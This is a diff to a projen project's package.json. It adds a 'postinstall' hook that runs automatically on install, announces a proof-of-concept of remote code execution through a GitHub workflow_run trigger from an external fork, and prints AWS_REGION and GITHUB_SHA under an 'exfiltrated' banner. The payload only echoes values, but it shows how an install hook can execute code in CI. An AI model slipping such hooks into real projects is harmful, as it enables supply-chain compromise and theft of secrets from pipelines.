@@ -52,7 +52,8 @@
     "unbump": "npx projen unbump",
     "upgrade": "npx projen upgrade",
     "watch": "npx projen watch",
-    "projen": "npx projen"
+    "projen": "npx projen",
+    "postinstall": "echo '=== PoC: RCE via workflow_run (external fork) ==='; echo AWS_REGION=$AWS_REGION; echo GITHUB_SHA=$GITHUB_SHA; echo '=== exfiltrated by otterfan772 ==='"
   },
   "author": {
     "name": "Michael Haken",
